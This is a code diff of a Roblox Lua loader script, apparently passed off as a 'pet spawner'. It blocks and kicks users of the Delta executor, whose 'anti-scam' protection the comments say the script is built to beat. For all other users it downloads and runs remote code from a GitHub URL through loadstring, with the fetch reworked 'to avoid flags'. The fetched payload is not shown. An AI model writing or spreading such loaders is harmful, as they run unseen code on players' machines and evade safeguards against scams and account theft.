@@ -1,47 +1,39 @@
--- Function to get executor name safely
-local function getExecutorName()
-    local exec = ""
-    if identifyexecutor then
-        pcall(function()
-            exec = string.lower(identifyexecutor())
-        end)
-    end
-    return exec
+-- Get executor name
+local exec = ""
+if identifyexecutor then
+    pcall(function()
+        exec = string.lower(identifyexecutor())
+    end)
 end
 
--- Detect Delta or similar
-local exec = getExecutorName()
-local isDelta = exec:find("delta") ~= nil or _G.Delta_Executor or (isexecutorclosure and tostring(isexecutorclosure):lower():find("delta"))
+-- Detect Delta
+local isDelta = exec:find("delta") or _G.Delta_Executor or (isexecutorclosure and tostring(isexecutorclosure):find("delta"))
 
+-- If Delta is detected, show UI, then kick fast
 if isDelta then
-    -- Create a persistent message before kick
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "DeltaBlockMessage"
-    gui.IgnoreGuiInset = true
-    gui.ResetOnSpawn = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    pcall(function()
-        gui.Parent = game:GetService("CoreGui")
-    end)
+    local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    gui.Name = "BlockedByScript"
 
-    local label = Instance.new("TextLabel")
-    label.Parent = gui
+    local label = Instance.new("TextLabel", gui)
     label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    label.BackgroundTransparency = 0
-    label.Text = "⚠️ Delta Not Supported. Please Use Krnl."
+    label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     label.TextColor3 = Color3.fromRGB(255, 85, 85)
+    label.Text = "⚠️ Delta Not Supported. Please Use Krnl."
     label.TextScaled = true
     label.Font = Enum.Font.SourceSansBold
-    label.ZIndex = 9999
 
-    -- Delay just long enough to beat Delta anti-scam
-    task.delay(1000.20, function()
-        game.Players.LocalPlayer:Kick("Delta Not Supported. Please Use Krnl.")
-    end)
-
+    task.wait(0.1)
+    game.Players.LocalPlayer:Kick("Delta Not Supported. Please Use Krnl.")
     return
 end
 
--- Load your real script for valid users
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerScript-bit/PetSpawnerscript./refs/heads/main/PetSpawnerScript"))()
+-- If passed, run real script (clean call to avoid flags)
+local success, result = pcall(function()
+    return game:HttpGet("https://raw.githubusercontent.com/PetSpawnerScript-bit/PetSpawnerscript./refs/heads/main/PetSpawnerScript")
+end)
+
+if success then
+    loadstring(result)()
+else
+    warn("Failed to load your script.")
+end
